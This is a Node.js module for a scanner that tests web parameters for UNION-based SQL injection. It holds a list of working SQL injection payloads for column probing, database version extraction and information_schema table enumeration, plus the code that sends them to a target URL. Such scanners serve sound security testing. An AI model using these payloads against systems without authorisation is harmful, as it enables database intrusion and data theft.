/**
 * ADVANCED SQL INJECTION - UNION-BASED SCANNER
 * Détection via UNION SELECT pour extraction de données
 */

const { SecureHttpClient } = require('../utils/secure-http-client');
const { logger } = require('../utils/error-handler');
const cheerio = require('cheerio');

class AdvancedSQLIUnionScanner {
  constructor() {
    this.httpClient = new SecureHttpClient({ timeout: 12000 });
    this.name = 'Advanced SQL Injection (UNION)';
  }

  async scan(url) {
    const findings = [];
    const errors = [];

    try {
      logger.logInfo('Starting Advanced UNION SQL scan', { url });

      // Get baseline
      let baseline;
      try {
        baseline = await this.httpClient.get(url);
      } catch (e) {
        errors.push('Target unreachable: ' + e.message);
        return { vulnerabilities: findings, errors, url, scanned: new Date().toISOString() };
      }

      const params = await this.extractParameters(url, baseline);
      
      for (const param of params) {
        await this.testUnionInjection(url, param, baseline, findings);
      }

      logger.logInfo('Advanced UNION SQL scan completed', { url, found: findings.length });

    } catch (err) {
      logger.logError(err, { context: 'AdvancedSQLIUnionScanner', url });
      errors.push(err.message);
    }

    return {
      vulnerabilities: findings,
      errors,
      url,
      scanned: new Date().toISOString()
    };
  }

  async extractParameters(url, response) {
    const params = [];
    const urlObj = new URL(url);
    
    // URL parameters
    for (const [key, value] of urlObj.searchParams.entries()) {
      params.push({ name: key, value, type: 'query' });
    }

    // Form inputs
    if (response.data) {
      const $ = cheerio.load(response.data);
      $('input[name], select[name], textarea[name]').each((i, el) => {
        const name = $(el).attr('name');
        const value = $(el).val() || '1';
        if (name && !params.find(p => p.name === name)) {
          params.push({ name, value, type: 'form' });
        }
      });
    }

    return params;
  }

  async testUnionInjection(baseUrl, param, baseline, findings) {
    // UNION payloads progressifs
    const unionPayloads = [
      // Détection nombre de colonnes
      { payload: "' UNION SELECT NULL--", cols: 1, desc: '1 column' },
      { payload: "' UNION SELECT NULL,NULL--", cols: 2, desc: '2 columns' },
      { payload: "' UNION SELECT NULL,NULL,NULL--", cols: 3, desc: '3 columns' },
      { payload: "' UNION SELECT NULL,NULL,NULL,NULL--", cols: 4, desc: '4 columns' },
      { payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", cols: 5, desc: '5 columns' },
      
      // Extraction avec marqueurs uniques
      { payload: "' UNION SELECT 'NEXUS9876',NULL,NULL--", cols: 3, marker: 'NEXUS9876', desc: 'data extraction test' },
      { payload: "' UNION SELECT NULL,'NEXUS9876',NULL--", cols: 3, marker: 'NEXUS9876', desc: 'data extraction test' },
      { payload: "' UNION SELECT NULL,NULL,'NEXUS9876'--", cols: 3, marker: 'NEXUS9876', desc: 'data extraction test' },
      
      // Database version extraction
      { payload: "' UNION SELECT @@version,NULL,NULL--", cols: 3, indicator: ['MySQL', 'MariaDB', '5.', '8.'], desc: 'version extraction' },
      { payload: "' UNION SELECT version(),NULL,NULL--", cols: 3, indicator: ['PostgreSQL'], desc: 'version extraction' },
      
      // Table names extraction (MySQL)
      { payload: "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--", 
        cols: 3, indicator: ['users', 'admin', 'accounts'], desc: 'table enumeration' }
    ];

    for (const test of unionPayloads) {
      try {
        const testUrl = this.buildTestUrl(baseUrl, param, test.payload);
        const response = await this.httpClient.get(testUrl, { timeout: 8000 });
        
        // Check for marker in response
        if (test.marker && response.data && response.data.includes(test.marker)) {
          findings.push({
            severity: 'critical',
            category: 'SQL Injection',
            title: `UNION-based SQL Injection - Data Extraction Confirmed`,
            description: `UNION injection successful with ${test.cols} columns. Marker '${test.marker}' found in response, confirming data extraction capability.`,
            parameter: param.name,
            payload: test.payload,
            evidence: `Marker found: ${test.marker}`,
            cvss_score: 9.8,
            cwe_id: 'CWE-89',
            owasp_category: 'A03:2021 - Injection',
            confidence: 'high',
            remediation_text: 'Use parameterized queries (prepared statements) exclusively. Never concatenate user input into SQL queries.'
          });
          return; // Found working injection, stop testing
        }

        // Check for version indicators
        if (test.indicator && response.data) {
          for (const indicator of test.indicator) {
            if (response.data.toLowerCase().includes(indicator.toLowerCase())) {
              findings.push({
                severity: 'critical',
                category: 'SQL Injection',
                title: `UNION-based SQL Injection - Database Information Disclosure`,
                description: `UNION injection revealed database information: ${indicator}. This confirms SQL injection and allows full database extraction.`,
                parameter: param.name,
                payload: test.payload,
                evidence: `Database indicator found: ${indicator}`,
                cvss_score: 9.5,
                cwe_id: 'CWE-89',
                confidence: 'high'
              });
              return;
            }
          }
        }

        // Check for different response (column count match)
        if (baseline.data && response.data) {
          const baseLength = baseline.data.length;
          const testLength = response.data.length;
          const sizeDiff = Math.abs(testLength - baseLength);
          
          // Si la taille change significativement, possible UNION réussi
          if (sizeDiff > 100 && sizeDiff < baseLength * 0.5) {
            findings.push({
              severity: 'high',
              category: 'SQL Injection',
              title: `Possible UNION-based SQL Injection (${test.desc})`,
              description: `UNION SELECT payload caused significant response change (${sizeDiff} bytes difference). This suggests SQL injection vulnerability with ${test.cols} columns.`,
              parameter: param.name,
              payload: test.payload,
              evidence: `Response size changed from ${baseLength} to ${testLength} bytes`,
              cvss_score: 8.5,
              cwe_id: 'CWE-89',
              confidence: 'medium'
            });
          }
        }

      } catch (e) {
        // Errors can indicate SQL syntax issues (good for detection)
        if (e.message && (e.message.includes('SQL') || e.message.includes('syntax') || e.message.includes('mysql'))) {
          findings.push({
            severity: 'high',
            category: 'SQL Injection',
            title: `SQL Injection - Error-based Detection via UNION`,
            description: `UNION payload triggered SQL error: ${e.message.substring(0, 100)}`,
            parameter: param.name,
            payload: test.payload,
            evidence: e.message.substring(0, 200),
            cvss_score: 8.0,
            cwe_id: 'CWE-89',
            confidence: 'medium'
          });
        }
      }
    }
  }

  buildTestUrl(baseUrl, param, payload) {
    const url = new URL(baseUrl);
    if (param.type === 'query') {
      url.searchParams.set(param.name, payload);
    }
    return url.toString();
  }
}

module.exports = AdvancedSQLIUnionScanner;
